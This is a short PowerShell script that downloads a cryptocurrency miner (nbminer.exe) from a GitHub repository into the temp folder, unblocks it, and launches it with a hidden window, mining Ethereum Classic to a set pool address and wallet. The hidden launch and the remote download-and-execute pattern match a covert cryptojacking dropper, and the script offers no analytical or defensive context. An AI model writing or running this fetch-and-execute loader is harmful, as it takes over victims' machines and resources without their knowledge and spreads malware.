# Set variables
$exeUrl = "https://github.com/Anarxyfr/gdfagdsagdsa/raw/refs/heads/main/nbminer.exe"
$exePath = "$env:TEMP\nbminer.exe"
$nbArgs = "-a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0x8e7bd35580ba4352d45d679254538b5d9ef164c2.anarxyfr -log"

# Download the EXE
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

# Unblock it (sometimes required)
Unblock-File -Path $exePath

# Launch hidden
Start-Process -FilePath $exePath -ArgumentList $nbArgs -WindowStyle Hidden
